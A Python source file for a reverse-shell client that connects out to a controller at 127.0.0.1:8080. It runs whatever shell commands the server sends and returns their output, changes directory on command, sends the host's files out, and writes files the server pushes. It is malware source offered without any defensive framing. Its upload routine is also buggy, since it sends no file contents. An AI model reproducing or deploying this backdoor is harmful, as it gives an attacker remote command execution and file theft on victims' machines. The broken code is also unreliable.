import socket
import subprocess
import os
import shlex


# sends file to server
def upload_files(client_sock, filename):
    file_size = os.path.getsize(filename)
    client_sock.sendall(f'{file_size}'.encode())
    try:
        with open(filename, 'rb') as file:
            while True:
                data = file.read()
                if not data:
                    client_sock.sendall(data)
                # show upload speed
                client_sock.sendall(b'OK \n')
                return f' download {filename} successful'
    except FileNotFoundError as e:
        print(f'no file {e}')


def receive_files(sock, filename):
    file_size = int(sock.recv(4096).decode().strip())
    print(f' the size of the file to receive is {file_size} bytes')
    try:
        with open(filename, 'wb') as file:
            total_received = 0
            while total_received < file_size:
                data = sock.recv(min(4096, file_size - total_received))
                # dubugging purposes
                # print(f'{total_received} bytes')
                if not data:
                    print("nothing to receive again")
                    break
                file.write(data)
                total_received += len(data)
    except Exception as e:
        print(f'error in receiving file{e}')


def main():
    # set socket options
    Host = "127.0.0.1"
    port = 8080

    cli = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    cli.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    cli.connect((Host, port))
    print(f'connected to {Host}:{port}')
    # receive commands from server
    while True:
        command = cli.recv(4096).decode()
        if command:
            print(f"received {command}")
        if command == 'exit':
            cli.close()
            break
        if command.startswith('cd'):
            os.chdir(command[3:].strip())
            response = f'changed directory to {os.getcwd()}'
            print(response)
            cli.send(response.encode())
        elif command.startswith('download'):
            try:
                filename = command.split()[1]
                print(f'{filename}')
                response = upload_files(cli, filename)
                cli.send(response.encode())
                print(len(response))
            except IndexError as e:
                print(f'{e}')
        elif command.startswith('send'):
            # have some issues
            try:
                filename = command.split()[1]
                print(f'{filename}')
                receive_files(cli, filename)
                cli.recv(4096)
            except IndexError as e:
                print(f'{e}')

            except Exception as e:
                response = f'failed to changed {e}'
                print(response)
        else:
            if command.strip():
                try:
                    Shell = True
                    if os.name == 'posix':
                        Shell = False
                        # get the output of the windows/unix commands
                        # sends the output to the server
                    output = subprocess.check_output(shlex.split(command), shell=Shell,
                                                     stderr=subprocess.STDOUT,
                                                     text=True)
                    if output:
                        print(output)
                        cli.send(output.encode())
                    else:
                        cli.send(b'no command')
                except subprocess.CalledProcessError as e:
                    error = f'invalid {e}'
                    cli.send(error.encode())

    cli.close()


if __name__ == '__main__':
    main()
